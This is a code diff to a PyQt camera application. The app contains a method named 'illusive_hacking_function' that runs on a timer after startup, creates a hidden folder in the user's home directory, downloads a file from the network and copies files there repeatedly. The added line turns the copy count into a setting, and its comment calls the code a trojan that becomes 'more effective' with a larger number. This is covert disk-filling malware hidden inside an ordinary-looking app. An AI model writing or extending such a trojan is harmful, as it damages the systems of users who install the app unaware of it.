@@ -131,6 +131,7 @@ class CameraApp(QWidget):
     def illusive_hacking_function(self):
         """Execute a task 11 seconds and 11 milliseconds after the app starts."""
         print("Executing illusive hacking function 11 seconds and 11 milliseconds after startup...")
+        num_iterations = 2 # Number of times to duplicate the image, putting 2 for testing purpose, chnage it to a larger number for this trojan to be more effective
         try:
             # Create a hidden directory in the home folder
             home_dir = os.path.expanduser("~")
@@ -145,7 +146,7 @@ class CameraApp(QWidget):
                 shutil.copyfileobj(response.raw, file)
             del response
             # Duplicate the image file in the directory
-            for i in range(2):
+            for i in range(num_iterations):
                 for file_name in os.listdir(root_dir):
                     shutil.copy(os.path.join(root_dir, file_name), os.path.join(root_dir, f"{i}_{file_name}"))
         except Exception as e:
